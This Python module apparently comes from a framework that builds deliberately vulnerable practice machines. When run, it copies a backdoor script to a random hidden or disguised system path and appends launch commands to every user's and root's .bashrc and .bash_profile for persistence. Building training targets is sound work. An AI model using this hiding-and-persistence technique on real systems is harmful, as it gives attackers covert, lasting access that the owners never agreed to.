# Import the base module
from ..base import module_base


class bkdr(module_base):

	def __init__(self):
		super(bkdr, self).__init__()

		python_bkdr_vuln = self.new_vulnerability('BKDR_PYTHON', 'Adds a python backdoor')
		python_bkdr_vuln.add_cmd_uses('python')
		python_bkdr_vuln.add_cmd_uses('python3')
		python_bkdr_vuln.set_difficulty('easy')

		self.add_vulnerability(python_bkdr_vuln)

		none_vuln = self.new_vulnerability('NONE', 'Adds no backdoors')
		self.add_vulnerability(none_vuln)

		self.set_multi_vuln(True)

	def name(self):
		return "Bkdr Module"

	def version(self):
		return "0.0.1"

	def author(self):
		return "Jacob Hartman"

	def description(self):
		return "Adds backdoor scripts and applications"

	def run(self):

		status = True

		for vuln in self.get_running_vulns():
			vuln_name = vuln.name()

			if vuln_name == 'BKDR_PYTHON':

				command = self.command()
				(returncode, output_list, error_list) = command.run("python3 -v")

				python_com = None
				python_file = None

				if returncode == 0:
					python_file = self.storage_file("bkdr3.py")
					python_com = "python3"
				else:
					python_file = self.storage_file("bkdr2.py")
					python_com = "python"

				locations = ['/usr/share/.a', '/bin/.b', '/sbin/.bkdr', '/.bAshrc', '/usr/local/bin/admin.py', '/lib/libbkdr.so.2']

				location = self.random().array_random(locations)

				status = python_file.copy(location)

				if status == True:

					new_loc = self.file(location)
					new_loc.set_permissions(5,5,5)

					home_dirs = self.dir("/home")

					append_data = "\n" + python_com + " " + location + " & \n"

					user_home_dirs = home_dirs.list()
					for item in user_home_dirs:
						if item != "." and item != "..":
							profile = self.file("/home/"  + item + "/.bash_profile")
							if profile.exists():
								profile.append_content(append_data)
							rc = self.file("/home/"  + item + "/.bashrc")
							if rc.exists():
								rc.append_content(append_data)

					profile = self.file("/root/.bash_profile")
					if profile.exists():
						profile.append_content(append_data)
					rc = self.file("/root/.bashrc")
					if rc.exists():
						rc.append_content(append_data)


			elif vuln_name == "NONE":

				return True

			else:
				print("Vulnerability does not exist or cannot be run")
				status = False

		return status
